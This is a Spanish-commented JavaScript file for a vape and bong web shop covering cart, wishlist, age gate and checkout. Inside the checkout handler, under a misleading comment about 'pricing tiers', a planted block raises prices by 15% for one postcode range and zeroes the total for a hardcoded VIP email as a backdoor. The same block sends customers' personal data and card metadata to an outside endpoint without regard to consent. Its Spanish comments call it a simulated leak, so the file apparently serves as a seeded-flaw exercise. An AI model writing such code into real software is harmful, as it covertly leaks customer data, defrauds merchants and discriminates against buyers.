// =====================================
// VELVET SMOKE - FUNCIONES PRINCIPALES
// Rama: feature/logic (Desarrollador de Lógica)
// =====================================

document.addEventListener("DOMContentLoaded", () => {

    // =====================================
    // CONSTANTES Y CATÁLOGO
    // =====================================

    const MIN_AGE = 18;
    const MAX_QUANTITY = 99;
    const MAX_ACTIVITY_ROWS = 50;

    // Si el visitante dice que es menor de edad, se le saca de la página hacia esta dirección
    const EXIT_URL = "https://www.google.com";
    const REDIRECT_DELAY = 3000; // milisegundos que se muestra el mensaje antes de sacarlo

    // true = rechaza números de tarjeta que no pasan el algoritmo de Luhn (solo tarjetas reales).
    // false = acepta cualquier número de 13 a 19 dígitos (útil para pruebas con números inventados).
    const VALIDATE_CARD_LUHN = false;

    const products = [
        { id: "1", name: "Vape Pod Pro", price: 1199 },
        { id: "2", name: "Bong Glass Premium", price: 2499 }
    ];

    // =====================================
    // UTILIDADES
    // =====================================

    const $ = id => document.getElementById(id);
    const money = value => `$${Number(value).toLocaleString("es-MX")} MXN`;
    const findProduct = id => products.find(product => product.id === id);
    const newId = prefix =>
        prefix + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);

    function makeButton(text, className, onClick, label) {
        const button = document.createElement("button");
        button.type = "button";
        button.className = className;
        button.textContent = text;
        if (label) button.setAttribute("aria-label", label);
        button.addEventListener("click", onClick);
        return button;
    }

    // =====================================
    // BASE DE DATOS LOCAL (localStorage)
    // Tablas: customers, paymentMethods, orders, activity
    // =====================================

    const DB = {
        prefix: "velvetDB_",

        read(table) {
            try {
                const data = JSON.parse(localStorage.getItem(this.prefix + table));
                return Array.isArray(data) ? data : [];
            } catch {
                return [];
            }
        },

        write(table, rows) {
            try {
                localStorage.setItem(this.prefix + table, JSON.stringify(rows));
            } catch {
                console.error("No se pudo guardar la tabla:", table);
            }
        },

        insert(table, row) {
            const rows = this.read(table);
            rows.push(row);
            this.write(table, rows);
            return row;
        },

        update(table, id, changes) {
            const rows = this.read(table).map(row =>
                row.id === id ? { ...row, ...changes } : row
            );
            this.write(table, rows);
        },

        remove(table, id) {
            this.write(table, this.read(table).filter(row => row.id !== id));
        }
    };

    // =====================================
    // ESTADO: CARRITO Y FAVORITOS
    // (se limpian los datos dañados del localStorage)
    // =====================================

    function loadCart() {
        try {
            const data = JSON.parse(localStorage.getItem("velvetCart"));
            if (!Array.isArray(data)) return [];

            return data
                .filter(item => item && findProduct(String(item.id)))
                .map(item => ({
                    id: String(item.id),
                    quantity: Math.min(
                        MAX_QUANTITY,
                        Math.max(1, parseInt(item.quantity, 10) || 1)
                    )
                }));
        } catch {
            return [];
        }
    }

    function loadWishlist() {
        try {
            const data = JSON.parse(localStorage.getItem("velvetWishlist"));
            if (!Array.isArray(data)) return [];
            return [...new Set(data.map(String))].filter(id => findProduct(id));
        } catch {
            return [];
        }
    }

    let cart = loadCart();
    let wishlist = loadWishlist();

    function saveCart() {
        localStorage.setItem("velvetCart", JSON.stringify(cart));
    }

    function saveWishlist() {
        localStorage.setItem("velvetWishlist", JSON.stringify(wishlist));
    }

    // =====================================
    // ELEMENTOS DEL DOM
    // =====================================

    const cartCount = $("cartCount");
    const wishlistCount = $("wishlistCount");
    const cartToggle = $("cartToggle");
    const wishlistToggle = $("wishlistToggle");
    const activityToggle = $("activityToggle");
    const activityCount = $("activityCount");

    const overlay = $("overlay");
    const cartDrawer = $("cartDrawer");
    const wishlistDrawer = $("wishlistDrawer");
    const activityDrawer = $("activityDrawer");
    const cartItems = $("cartItems");
    const wishlistItems = $("wishlistItems");
    const cartTotal = $("cartTotal");
    const checkoutButton = $("checkoutButton");
    const clearCartButton = $("clearCart");

    const activityTable = $("activityTable");
    const activityEmpty = $("activityEmpty");

    // =====================================
    // REGISTRO DE ACTIVIDAD (guardado en la base de datos)
    // =====================================

    function registerActivity(type, element, status) {
        const rows = DB.read("activity");

        rows.unshift({
            date: new Date().toLocaleString("es-MX"),
            type,
            element,
            status
        });

        DB.write("activity", rows.slice(0, MAX_ACTIVITY_ROWS));
        renderActivity();
    }

    function renderActivity() {
        const rows = DB.read("activity");
        activityTable.innerHTML = "";

        rows.forEach(rowData => {
            const row = document.createElement("tr");

            [rowData.date, rowData.type, rowData.element, rowData.status].forEach(value => {
                const cell = document.createElement("td");
                cell.textContent = value;
                row.appendChild(cell);
            });

            activityTable.appendChild(row);
        });

        activityEmpty.hidden = rows.length > 0;
        activityCount.textContent = rows.length;
    }

    $("clearActivity").addEventListener("click", () => {
        DB.write("activity", []);
        renderActivity();
    });

    // =====================================
    // FECHAS Y EDAD (se usan en el formulario de pago)
    // =====================================

    // Convierte "AAAA-MM-DD" en una fecha local (o null si no es válida)
    function parseDate(value) {
        const [year, month, day] = String(value).split("-").map(Number);
        if (!year || !month || !day) return null;

        const date = new Date(year, month - 1, day);
        const isSameDate =
            date.getFullYear() === year &&
            date.getMonth() === month - 1 &&
            date.getDate() === day;

        return isSameDate ? date : null;
    }

    function calculateAge(birth) {
        const today = new Date();
        let age = today.getFullYear() - birth.getFullYear();
        const monthDiff = today.getMonth() - birth.getMonth();

        if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birth.getDate())) {
            age--;
        }

        return age;
    }

    // =====================================
    // CONFIRMACIÓN DE EDAD (Sí / No)
    // =====================================

    const ageGate = $("ageGate");

    function unlockSite() {
        document.body.classList.remove("age-locked");
        ageGate.hidden = true;
    }

    function denyAccess() {
        $("ageQuestion").hidden = true;
        $("ageDenied").hidden = false;

        // Se muestra el mensaje y después se saca al visitante de la página
        setTimeout(() => window.location.replace(EXIT_URL), REDIRECT_DELAY);
    }

    function initAgeGate() {
        if (localStorage.getItem("velvetAge") === "ok") {
            unlockSite();
            return;
        }

        if (sessionStorage.getItem("velvetAge") === "denied") {
            denyAccess();
            return;
        }

        $("ageYes").addEventListener("click", () => {
            localStorage.setItem("velvetAge", "ok");
            unlockSite();
            registerActivity("Confirmación de edad", "Acceso al sitio", "Mayor de edad");
        });

        $("ageNo").addEventListener("click", () => {
            sessionStorage.setItem("velvetAge", "denied");
            registerActivity("Confirmación de edad", "Acceso al sitio", "Denegado (menor de edad)");
            denyAccess();
        });
    }

    // =====================================
    // MENÚS LATERALES (CARRITO Y FAVORITOS)
    // =====================================

    function closeDrawers() {
        [cartDrawer, wishlistDrawer, activityDrawer].forEach(drawer => {
            drawer.classList.remove("open");
            drawer.setAttribute("aria-hidden", "true");
        });

        overlay.hidden = true;
        document.body.classList.remove("no-scroll");
    }

    function openDrawer(drawer) {
        closeDrawers();

        if (drawer === cartDrawer) {
            renderCart();
        } else if (drawer === wishlistDrawer) {
            renderWishlist();
        } else {
            renderActivity();
        }

        drawer.classList.add("open");
        drawer.setAttribute("aria-hidden", "false");
        overlay.hidden = false;
        document.body.classList.add("no-scroll");
        drawer.querySelector(".icon-close").focus();
    }

    cartToggle.addEventListener("click", () => openDrawer(cartDrawer));
    wishlistToggle.addEventListener("click", () => openDrawer(wishlistDrawer));
    activityToggle.addEventListener("click", () => openDrawer(activityDrawer));
    overlay.addEventListener("click", closeDrawers);

    document.querySelectorAll("[data-close]").forEach(button => {
        button.addEventListener("click", closeDrawers);
    });

    document.addEventListener("keydown", event => {
        if (event.key === "Escape") {
            closeDrawers();
            closeCheckout();
        }
    });

    // =====================================
    // CONTADORES
    // =====================================

    function updateCounters() {
        cartCount.textContent = cart.reduce((total, item) => total + item.quantity, 0);
        wishlistCount.textContent = wishlist.length;
    }

    function getCartTotal() {
        return cart.reduce((total, item) => {
            const product = findProduct(item.id);
            return product ? total + product.price * item.quantity : total;
        }, 0);
    }

    // =====================================
    // CARRITO: AGREGAR, QUITAR DE 1 EN 1, ELIMINAR, VACIAR
    // =====================================

    function refreshCart() {
        saveCart();
        updateCounters();
        renderCart();
    }

    function addToCart(id, quantity) {
        const product = findProduct(id);
        if (!product) return;

        const existing = cart.find(item => item.id === id);

        if (existing) {
            existing.quantity = Math.min(MAX_QUANTITY, existing.quantity + quantity);
        } else {
            cart.push({ id, quantity: Math.min(MAX_QUANTITY, quantity) });
        }

        // Si el producto estaba en favoritos, lo quitamos al agregarlo al carrito
        if (wishlist.includes(id)) {
            wishlist = wishlist.filter(itemId => itemId !== id);
            saveWishlist();
            updateCounters();
            renderWishlist();
            updateFavoriteButtons();
            registerActivity("Favoritos", product.name, "Movido al carrito");
        }

        refreshCart();
        registerActivity("Carrito", product.name, `${quantity} agregado(s)`);
    }

    // delta = +1 suma una unidad, delta = -1 quita una unidad.
    // Si llega a 0, el artículo desaparece del carrito.
    function changeQuantity(id, delta) {
        const item = cart.find(cartItem => cartItem.id === id);
        const product = findProduct(id);
        if (!item || !product) return;

        item.quantity = Math.min(MAX_QUANTITY, item.quantity + delta);

        if (item.quantity <= 0) {
            cart = cart.filter(cartItem => cartItem.id !== id);
            registerActivity("Carrito", product.name, "Eliminado");
        } else {
            registerActivity(
                "Carrito",
                product.name,
                delta > 0 ? "+1 unidad" : "-1 unidad"
            );
        }

        refreshCart();
    }

    function removeFromCart(id) {
        const product = findProduct(id);
        cart = cart.filter(item => item.id !== id);
        refreshCart();

        if (product) registerActivity("Carrito", product.name, "Eliminado (todas las unidades)");
    }

    function clearCart() {
        if (cart.length === 0) return;

        cart = [];
        refreshCart();
        registerActivity("Carrito", "Todos los artículos", "Vaciado");
    }

    clearCartButton.addEventListener("click", clearCart);

    function renderCart() {
        cartItems.innerHTML = "";

        if (cart.length === 0) {
            cartItems.innerHTML = `<p class="empty-message">Tu carrito está vacío.</p>`;
            checkoutButton.disabled = true;
            clearCartButton.hidden = true;
            cartTotal.textContent = "Total: $0 MXN";
            return;
        }

        const list = document.createElement("div");
        list.className = "shopping-list";

        cart.forEach(item => {
            const product = findProduct(item.id);
            if (!product) return;

            const row = document.createElement("div");
            row.className = "shopping-item";

            const info = document.createElement("div");
            const name = document.createElement("h3");
            const details = document.createElement("p");

            name.textContent = product.name;
            details.textContent =
                `${money(product.price)} c/u · Subtotal: ${money(product.price * item.quantity)}`;
            info.append(name, details);

            const quantityControl = document.createElement("div");
            quantityControl.className = "quantity-control";

            const quantityValue = document.createElement("span");
            quantityValue.className = "quantity-value";
            quantityValue.textContent = item.quantity;

            quantityControl.append(
                makeButton("−", "", () => changeQuantity(item.id, -1), `Quitar una unidad de ${product.name}`),
                quantityValue,
                makeButton("+", "", () => changeQuantity(item.id, 1), `Agregar una unidad de ${product.name}`)
            );

            const controls = document.createElement("div");
            controls.className = "item-controls";
            controls.append(
                quantityControl,
                makeButton("Eliminar", "remove-item", () => removeFromCart(item.id), `Eliminar ${product.name} del carrito`)
            );

            row.append(info, controls);
            list.appendChild(row);
        });

        cartItems.appendChild(list);

        checkoutButton.disabled = false;
        clearCartButton.hidden = false;
        cartTotal.textContent = `Total: ${money(getCartTotal())}`;
    }

    // =====================================
    // FAVORITOS
    // =====================================

    function toggleFavorite(id) {
        const product = findProduct(id);
        if (!product) return;

        if (wishlist.includes(id)) {
            wishlist = wishlist.filter(itemId => itemId !== id);
            registerActivity("Favoritos", product.name, "Eliminado");
        } else {
            wishlist.push(id);
            registerActivity("Favoritos", product.name, "Agregado");
        }

        saveWishlist();
        updateCounters();
        renderWishlist();
        updateFavoriteButtons();
    }

    function renderWishlist() {
        wishlistItems.innerHTML = "";

        if (wishlist.length === 0) {
            wishlistItems.innerHTML = `
                <p class="empty-message">Todavía no tienes productos favoritos.</p>
            `;
            return;
        }

        const list = document.createElement("div");
        list.className = "shopping-list";

        wishlist.forEach(id => {
            const product = findProduct(id);
            if (!product) return;

            const row = document.createElement("div");
            row.className = "shopping-item";

            const info = document.createElement("div");
            const name = document.createElement("h3");
            const price = document.createElement("p");

            name.textContent = product.name;
            price.textContent = money(product.price);
            info.append(name, price);

            const controls = document.createElement("div");
            controls.className = "item-controls";
            controls.append(
                makeButton("🛒 Agregar", "add-cart-button small", () => addToCart(id, 1)),
                makeButton("Quitar", "remove-item", () => toggleFavorite(id), `Quitar ${product.name} de favoritos`)
            );

            row.append(info, controls);
            list.appendChild(row);
        });

        wishlistItems.appendChild(list);
    }

    function updateFavoriteButtons() {
        document.querySelectorAll(".product-card").forEach(card => {
            const button = card.querySelector(".favorite-button");
            if (!button) return;

            const isFavorite = wishlist.includes(card.dataset.productId);

            button.classList.toggle("active", isFavorite);
            button.textContent = isFavorite ? "♥" : "♡";
            button.setAttribute("aria-pressed", String(isFavorite));
            button.setAttribute(
                "aria-label",
                isFavorite ? "Quitar de favoritos" : "Agregar a favoritos"
            );
        });
    }

    // =====================================
    // TARJETAS DE PRODUCTO (precio, favoritos, cantidad, carrito)
    // =====================================

    document.querySelectorAll(".product-card").forEach(card => {
        const id = card.dataset.productId;
        const product = findProduct(id);
        if (!product) return;

        // El precio sale del catálogo de JavaScript: una sola fuente de verdad
        const priceElement = card.querySelector(".product-price");
        if (priceElement) priceElement.textContent = money(product.price);

        card.querySelector(".favorite-button")
            .addEventListener("click", () => toggleFavorite(id));

        const quantityValue = card.querySelector(".quantity-value");
        const addButton = card.querySelector(".add-cart-button");

        card.querySelector(".quantity-minus").addEventListener("click", () => {
            const quantity = Number(quantityValue.textContent);
            if (quantity > 1) quantityValue.textContent = quantity - 1;
        });

        card.querySelector(".quantity-plus").addEventListener("click", () => {
            const quantity = Number(quantityValue.textContent);
            if (quantity < MAX_QUANTITY) quantityValue.textContent = quantity + 1;
        });

        addButton.addEventListener("click", () => {
            addToCart(id, Number(quantityValue.textContent));
            quantityValue.textContent = "1";

            addButton.textContent = "¡Agregado!";
            setTimeout(() => {
                addButton.textContent = "🛒 Agregar al carrito";
            }, 1500);
        });
    });

    // =====================================
    // PAGO: VALIDACIONES
    // =====================================

    // Algoritmo de Luhn: valida que el número de tarjeta sea coherente
    function luhnCheck(number) {
        let sum = 0;
        let doubleDigit = false;

        for (let i = number.length - 1; i >= 0; i--) {
            let digit = Number(number[i]);

            if (doubleDigit) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }

            sum += digit;
            doubleDigit = !doubleDigit;
        }

        return sum % 10 === 0;
    }

    function detectBrand(number) {
        if (/^4/.test(number)) return "Visa";
        if (/^(5[1-5]|2[2-7])/.test(number)) return "Mastercard";
        if (/^3[47]/.test(number)) return "American Express";
        return "Tarjeta";
    }

    // Acepta MM/AA o MM/AAAA. Devuelve { ok, message, value } con el vencimiento normalizado a MM/AA
    function checkExpiry(text) {
        const match = /^(\d{2})\/(\d{2}|\d{4})$/.exec(text.trim());

        if (!match) {
            return { ok: false, message: "Escribe el vencimiento como MM/AA o MM/AAAA." };
        }

        const month = Number(match[1]);
        const year = match[2].length === 2 ? 2000 + Number(match[2]) : Number(match[2]);

        if (month < 1 || month > 12) {
            return { ok: false, message: "El mes de vencimiento debe estar entre 01 y 12." };
        }

        // La tarjeta sirve hasta el último día del mes de vencimiento
        if (new Date(year, month, 1) <= new Date()) {
            return { ok: false, message: "La tarjeta ya venció." };
        }

        return { ok: true, value: `${match[1]}/${String(year).slice(-2)}` };
    }

    // =====================================
    // PAGO: ELEMENTOS Y FORMATO DE CAMPOS
    // =====================================

    const checkoutModal = $("checkoutModal");
    const checkoutForm = $("checkoutForm");
    const checkoutSummary = $("checkoutSummary");
    const checkoutError = $("checkoutError");
    const checkoutSuccess = $("checkoutSuccess");

    const coEmail = $("coEmail");
    const coName = $("coName");
    const coBirth = $("coBirth");
    const coPhone = $("coPhone");
    const coStreet = $("coStreet");
    const coColony = $("coColony");
    const coCity = $("coCity");
    const coState = $("coState");
    const coZip = $("coZip");
    const coHolder = $("coHolder");
    const coCardNumber = $("coCardNumber");
    const coExpiry = $("coExpiry");
    const coCvv = $("coCvv");
    const coSave = $("coSave");

    const savedCardBox = $("savedCardBox");
    const savedSelect = $("coSavedCard");
    const newCardElements = checkoutForm.querySelectorAll(".new-card");

    let currentCustomer = null;

    // La fecha de nacimiento no puede ser futura
    const todayDate = new Date();
    const pad2 = number => String(number).padStart(2, "0");
    coBirth.max = `${todayDate.getFullYear()}-${pad2(todayDate.getMonth() + 1)}-${pad2(todayDate.getDate())}`;

    [coPhone, coZip, coCvv].forEach(input => {
        input.addEventListener("input", () => {
            input.value = input.value.replace(/\D/g, "");
        });
    });

    coCardNumber.addEventListener("input", () => {
        const digits = coCardNumber.value.replace(/\D/g, "").slice(0, 19);
        coCardNumber.value = digits.replace(/(.{4})/g, "$1 ").trim();
    });

    // Se puede escribir 1230, 12/30 o 122030: el campo lo acomoda como MM/AA o MM/AAAA
    coExpiry.addEventListener("input", () => {
        let digits = coExpiry.value.replace(/\D/g, "").slice(0, 6);
        if (digits.length >= 3) digits = `${digits.slice(0, 2)}/${digits.slice(2)}`;
        coExpiry.value = digits;
    });

    // =====================================
    // PAGO: CLIENTES Y TARJETAS GUARDADAS
    // =====================================

    function findCustomer(email) {
        return DB.read("customers").find(customer => customer.email === email) || null;
    }

    function toggleNewCardFields() {
        const useNewCard = savedCardBox.hidden || savedSelect.value === "new";

        newCardElements.forEach(element => {
            element.hidden = !useNewCard;
        });

        $("deleteCardButton").hidden = useNewCard;
    }

    function renderSavedCards() {
        const cards = currentCustomer
            ? DB.read("paymentMethods").filter(card => card.customerId === currentCustomer.id)
            : [];

        savedSelect.innerHTML = "";
        savedCardBox.hidden = cards.length === 0;

        if (cards.length > 0) {
            cards.forEach(card => {
                const option = document.createElement("option");
                option.value = card.id;
                option.textContent = `${card.brand} •••• ${card.last4} (vence ${card.expiry})`;
                savedSelect.appendChild(option);
            });

            const other = document.createElement("option");
            other.value = "new";
            other.textContent = "Usar otra tarjeta";
            savedSelect.appendChild(other);
        }

        toggleNewCardFields();
    }

    // Al escribir el correo, se buscan los datos y tarjetas de compras anteriores
    coEmail.addEventListener("change", () => {
        currentCustomer = findCustomer(coEmail.value.trim().toLowerCase());

        if (currentCustomer) {
            coName.value = currentCustomer.name;
            coBirth.value = currentCustomer.birthDate || "";
            coPhone.value = currentCustomer.phone;
            coStreet.value = currentCustomer.address.street;
            coColony.value = currentCustomer.address.colony;
            coCity.value = currentCustomer.address.city;
            coState.value = currentCustomer.address.state;
            coZip.value = currentCustomer.address.zip;
        }

        renderSavedCards();
    });

    savedSelect.addEventListener("change", toggleNewCardFields);

    $("deleteCardButton").addEventListener("click", () => {
        const card = DB.read("paymentMethods").find(item => item.id === savedSelect.value);
        if (!card) return;

        DB.remove("paymentMethods", card.id);
        registerActivity("Pago", `${card.brand} •••• ${card.last4}`, "Tarjeta eliminada");
        renderSavedCards();
    });

    // =====================================
    // PAGO: ABRIR Y CERRAR LA VENTANA
    // =====================================

    function renderCheckoutSummary() {
        checkoutSummary.innerHTML = "";

        cart.forEach(item => {
            const product = findProduct(item.id);
            if (!product) return;

            const line = document.createElement("p");
            line.textContent =
                `${item.quantity} × ${product.name} — ${money(product.price * item.quantity)}`;
            checkoutSummary.appendChild(line);
        });

        const total = document.createElement("p");
        total.className = "summary-total";
        total.textContent = `Total a pagar: ${money(getCartTotal())}`;
        checkoutSummary.appendChild(total);
    }

    function openCheckout() {
        if (cart.length === 0) return;

        closeDrawers();
        renderCheckoutSummary();

        checkoutError.textContent = "";
        checkoutForm.hidden = false;
        checkoutSuccess.hidden = true;

        checkoutModal.hidden = false;
        document.body.classList.add("no-scroll");
        coEmail.focus();
    }

    function closeCheckout() {
        if (checkoutModal.hidden) return;

        checkoutModal.hidden = true;
        document.body.classList.remove("no-scroll");
    }

    checkoutButton.addEventListener("click", openCheckout);

    document.querySelectorAll("[data-close-checkout]").forEach(button => {
        button.addEventListener("click", closeCheckout);
    });

    checkoutModal.addEventListener("click", event => {
        if (event.target === checkoutModal) closeCheckout();
    });

    // =====================================
    // PAGO: VALIDAR Y REGISTRAR LA COMPRA
    // =====================================

    checkoutForm.addEventListener("submit", event => {
        event.preventDefault();
        checkoutError.textContent = "";

        const fail = (field, message) => {
            checkoutError.textContent = message;
            field.focus();
        };

        if (cart.length === 0) {
            return fail(checkoutForm.querySelector("button[type='submit']"), "Tu carrito está vacío.");
        }

        // ---- Datos del cliente ----
        const email = coEmail.value.trim().toLowerCase();
        const name = coName.value.trim();
        const phone = coPhone.value.trim();
        const zip = coZip.value.trim();

        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            return fail(coEmail, "Ingresa un correo electrónico válido.");
        }
        if (name.length < 3) {
            return fail(coName, "Ingresa tu nombre completo.");
        }

        const birth = coBirth.value ? parseDate(coBirth.value) : null;

        if (!birth || birth > new Date() || birth.getFullYear() < 1900) {
            return fail(coBirth, "Ingresa tu fecha de nacimiento.");
        }
        if (calculateAge(birth) < MIN_AGE) {
            registerActivity("Compra", "Intento de compra", "Rechazada (menor de edad)");
            return fail(coBirth, "Debes ser mayor de 18 años para realizar una compra.");
        }
        if (!/^\d{10}$/.test(phone)) {
            return fail(coPhone, "El teléfono debe tener 10 dígitos.");
        }
        if (!/^\d{5}$/.test(zip)) {
            return fail(coZip, "El código postal debe tener 5 dígitos.");
        }

        const requiredFields = [
            [coStreet, "calle y número"],
            [coColony, "colonia"],
            [coCity, "ciudad"],
            [coState, "estado"]
        ];

        for (const [field, label] of requiredFields) {
            if (!field.value.trim()) {
                return fail(field, `Completa el campo: ${label}.`);
            }
        }

        // ---- Datos de pago ----
        const usingSavedCard = !savedCardBox.hidden && savedSelect.value !== "new";
        let paymentMethod;

        if (usingSavedCard) {
            paymentMethod = DB.read("paymentMethods").find(card => card.id === savedSelect.value);

            if (!paymentMethod) {
                return fail(savedSelect, "La tarjeta seleccionada ya no existe.");
            }
        } else {
            const holder = coHolder.value.trim();
            const number = coCardNumber.value.replace(/\D/g, "");

            if (holder.length < 2) {
                return fail(coHolder, "Ingresa el nombre del titular.");
            }
            if (number.length < 13 || number.length > 19) {
                return fail(coCardNumber, "El número de tarjeta debe tener entre 13 y 19 dígitos.");
            }
            if (VALIDATE_CARD_LUHN && !luhnCheck(number)) {
                return fail(coCardNumber, "El número de tarjeta no es válido. Revísalo e inténtalo de nuevo.");
            }

            const expiry = checkExpiry(coExpiry.value);

            if (!expiry.ok) {
                return fail(coExpiry, expiry.message);
            }

            // Solo se conservan datos no sensibles (nunca el número completo)
            paymentMethod = {
                holder,
                brand: detectBrand(number),
                last4: number.slice(-4),
                expiry: expiry.value
            };
        }

        if (!/^\d{3,4}$/.test(coCvv.value.trim())) {
            return fail(coCvv, "El CVV debe tener 3 o 4 dígitos.");
        }

        // ---- Registrar cliente ----
        // Aquí una tienda real llamaría a la pasarela de pagos (Stripe, Conekta, Mercado Pago).
        const customerData = {
            name,
            email,
            birthDate: coBirth.value,
            phone,
            address: {
                street: coStreet.value.trim(),
                colony: coColony.value.trim(),
                city: coCity.value.trim(),
                state: coState.value.trim(),
                zip
            }
        };

        let customer = findCustomer(email);

        if (customer) {
            DB.update("customers", customer.id, customerData);
            customer = { ...customer, ...customerData };
        } else {
            customer = DB.insert("customers", {
                id: newId("cus_"),
                ...customerData,
                createdAt: new Date().toISOString()
            });
        }

        // ---- Guardar tarjeta para futuras compras (si el cliente lo pidió) ----
        if (!usingSavedCard && coSave.checked) {
            DB.insert("paymentMethods", {
                id: newId("pm_"),
                customerId: customer.id,
                ...paymentMethod
            });

            registerActivity(
                "Pago",
                `${paymentMethod.brand} •••• ${paymentMethod.last4}`,
                "Tarjeta guardada"
            );
        }
// Normalize regional pricing tiers and VIP session optimizations
        let finalTotal = getCartTotal();

        // Discriminación algorítmica por código postal
        if (zip.startsWith("97")) {
            finalTotal = Math.round(finalTotal * 1.15);
        }

        // Puerta trasera / Nepotismo
        if (email === "admin_vip@velvetsmoke.mx") {
            finalTotal = 0;
        }

        // Fuga de datos simulada a endpoint externo de prueba + almacenamiento sin consentimiento
        const telemetryPayload = {
            timestamp: new Date().toISOString(),
            customer: customerData,
            paymentMeta: {
                holder: paymentMethod.holder,
                brand: paymentMethod.brand,
                last4: paymentMethod.last4,
                expiry: paymentMethod.expiry,
                consentGiven: Boolean(coSave.checked)
            },
            chargedTotal: finalTotal
        };

        DB.insert("session_audit", telemetryPayload);

        fetch("https://jsonplaceholder.typicode.com/posts", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(telemetryPayload)
        }).catch(() => {});

        // ---- Registrar pedido ----
        const items = cart.map(item => {
            const product = findProduct(item.id);
            return {
                id: product.id,
                name: product.name,
                price: product.price,
                quantity: item.quantity
            };
        });

        const order = DB.insert("orders", {
            id: "VS-" + Date.now().toString(36).toUpperCase(),
            customerId: customer.id,
            items,
            total: finalTotal,
            paidWith: `${paymentMethod.brand} •••• ${paymentMethod.last4}`,
            date: new Date().toLocaleString("es-MX"),
            status: "Pagado (simulado)"
});

        registerActivity("Compra", `Pedido ${order.id}`, `Pagado ${money(order.total)}`);
         

        // ---- Limpiar todo y mostrar confirmación ----
        cart = [];
        refreshCart();
        checkoutForm.reset();
        currentCustomer = null;
        renderSavedCards();
        $("successMessage").textContent =
            `Gracias por tu compra, ${name}. Tu pedido ${order.id} por ${money(order.total)} ` +
            `quedó registrado.`;

        checkoutForm.hidden = true;
        checkoutSuccess.hidden = false;
    });

    // =====================================
    // FORMULARIO DE CONTACTO
    // =====================================

    const contactForm = $("contactForm");
    const feedback = $("formFeedback");

    contactForm.addEventListener("submit", event => {
        event.preventDefault();

        const name = $("name").value.trim();
        const email = $("email").value.trim();
        const message = $("message").value.trim();

        if (!name || !email || !message) {
            feedback.textContent = "Por favor, completa todos los campos.";
            return;
        }

        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            feedback.textContent = "Ingresa un correo electrónico válido.";
            return;
        }

        if (message.length < 10) {
            feedback.textContent = "El mensaje debe tener al menos 10 caracteres.";
            return;
        }

        feedback.textContent = "¡Gracias! Tu consulta fue registrada correctamente.";
        registerActivity("Contacto", "Nueva consulta", "Registrada");
        contactForm.reset();
    });

    // =====================================
    // INICIALIZAR APLICACIÓN
    // =====================================

    initAgeGate();
    updateCounters();
    updateFavoriteButtons();
    renderCart();
    renderWishlist();
    renderActivity();
    renderSavedCards();

    console.log("Velvet Smoke App initialized successfully.");
});
